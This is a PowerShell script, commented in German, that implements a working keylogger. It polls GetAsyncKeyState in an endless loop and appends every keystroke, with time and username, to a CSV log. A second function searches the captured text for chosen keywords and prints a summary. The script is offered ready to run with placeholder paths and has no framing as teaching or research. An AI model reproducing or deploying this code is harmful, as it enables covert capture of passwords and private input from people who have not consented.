# Keylogger inklv. Funktion zum Auslesen und Analysieren des Logs

 function Write-Keylogger {
    Param(
        [Parameter(Mandatory)]
        [string]$LogPath
    )

    # Definiere Signatur von externen Funktion "GetAsyncKeyState" aus der "user32.dll"
$signature = @"
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
"@

    # Füge Typ mit definierter Signatur hinzu
    $getKeyState = Add-Type -memberDefinition $signature -name "Newtype" -namespace newnamespace -passThru

    # Schreibe die Header-Zeile ins Log mit Datum, Uhrzeit und Benutzer
    $headerCSV = "Time,User,Key,Code"
    if (!(Test-Path -Path $LogPath)) {
        Add-Content -Path $LogPath -Value $headerCSV
    }

    # starte Endlosschleife
    while ($true) {
        #Start-Sleep -Milliseconds 10

        # Iteriere über mögliche Tasten-Codes (1 bis 254)
        $logged = ""
        for ($char=1; $char -le 254; $char++) {
            $vkey = $char
            $logged = $getKeyState::GetAsyncKeyState($vkey)

            # -32767 ist der Rückgabewert für gedrückte Tasten
            if ($logged -eq -32767) {
                $code = $vkey
                # Setze falsch interpretierte Zeichen anhand von ermittelten ASCII-Codes
                $keyChar = switch ($vkey) {
                    228 {'ä'}
                    226 {'<'}
                    222 {'ä'}
                    221 {'´'}
                    220 {'^'}
                    219 {'ß'}
                    192 {'ö'}
                    191 {'#'}
                    190 {'.'}
                    189 {'-'}
                    188 {'COMMA'}
                    187 {'+'}
                    186 {'ü'}
                    165 {'ALT unpressed'}
                    164 {'ALT unpressed'}
                    163 {'STRG unpressed'}
                    162 {'STRG unpressed'}
                    161 {'SHIFT unpressed'}
                    160 {'SHIFT unpressed'}
                    91 {'WINDOWS'}
                    32 {'SPACE'}
                    27 {'ESC'}
                    20 {'CAPS-LOCK'}
                    18 {'ALT pressed'}
                    17 {'STRG pressed'}
                    16 {'SHIFT pressed'}
                    13 {'ENTER'}
                    9 {'TAB'}
                    8 {'BACKSPACE'}
                    4 {'MOUSE_WHEELl '}
                    2 {'RIGHT_CLICK'}
                    1 {'LEFT_CLICK'}
                    default { [char]$vkey }
                }

                # Erfasse das aktuelle Datum, die Uhrzeit und den Benutzer
                $currentTime = Get-Date -Format HH:mm
                $currentUser = $env:USERNAME

                # schreibe Log
                $logEntry = "{0},{1},{2},{3}" -f $currentTime, $currentUser, $keyChar, $code
                Add-Content -Path $LogPath -Value $logEntry
            }
        }
    }
}

function Read-KeyloggerLog {
    param(
        [Parameter(Mandatory)]
        [string]$LogPath,
        [Parameter(Mandatory)]
        [string[]]$KeywordArray
    )

    # einlesen des Logs als XML
    $keys = Get-Content -Path $LogPath | ConvertFrom-Csv -Delimiter ","

    # wandle Log in eine einzige Zeichenkette um
    [string]$log = ""
    foreach ($key in $keys.key) {
        $log += $key
    }

    # suche soll unabhängig von Groß- und Kleinschreibung sein - weshalb für die Suche alles in Kleinschreibung passiert
    $logStringLower = $log.ToLower()
    $keywordsLower = $KeywordArray.ToLower()

    $keywordFoundReturn = $null
    $keywordNotFoundReturn = $null

    # durchsuche log nach Keword 
    foreach ($keyword in $keywordsLower) {
        if ($logStringLower.Contains($keyword)) {
            [array[]]$keywordFoundReturn += "Keyword gefunden: $keyword"
        }
        else {
            [array[]]$keywordNotFoundReturn += "Keyword nicht gefunden: $keyword"
        }
    }

    $timeDiff = New-TimeSpan -Start $keys.time[0] -End $keys.time[-1]
    $user = $keys.user[0]

    $asciiArt = "
     __        ______     _______           ___      .__   __.      ___       __      ____    ____  _______. _______ 
    |  |      /  __  \   /  _____|         /   \     |  \ |  |     /   \     |  |     \   \  /   / /       ||   ____|
    |  |     |  |  |  | |  |  __   ______ /  ^  \    |   \|  |    /  ^  \    |  |      \   \/   / |   (----'|  |__   
    |  |     |  |  |  | |  | |_ | |______/  /_\  \   |  . '  |   /  /_\  \   |  |       \_    _/   \   \    |   __|  
    |  '----.|  '--'  | |  |__| |       /  _____  \  |  |\   |  /  _____  \  |  '----.    |  | .----)   |   |  |____ 
    |_______| \______/   \______|      /__/     \__\ |__| \__| /__/     \__\ |_______|    |__| |_______/    |_______|
    "

    Write-Host "$asciiArt" -ForegroundColor Magenta
    Write-Host "________________________________________________________________________________________________________________________" -ForegroundColor Magenta
    Write-Host ""
    Write-Host "<< Zeitspanne >>"
    Write-Host "Zeitpunkt der ersten Eingabe:  $($keys.time[0])"
    Write-Host "Zeitpunkt der letzten Eingabe: $($keys.time[-1])"
    Write-Host "Zeitdifferenz: $($timeDiff)"
    Write-Host ""
    Write-Host "<< Benutzer >>"
    Write-Host "Benutzer: $($user)"
    Write-Host ""
    Write-Host "<< Keywords >>"
    foreach ($string in $keywordFoundReturn) {
        Write-Host "$($string)" -ForegroundColor Green
    }
    foreach ($string in $keywordNotFoundReturn) {
        Write-Host "$($string)" -ForegroundColor Red
    }
}

# Funktionsaufruf des Keyloggers
Write-Keylogger -LogPath <PATH>

# Funktionsaufruf des Log Analyse, sammt Parameter
Read-KeyloggerLog -LogPath <PATH> -keyword <ARRAY>









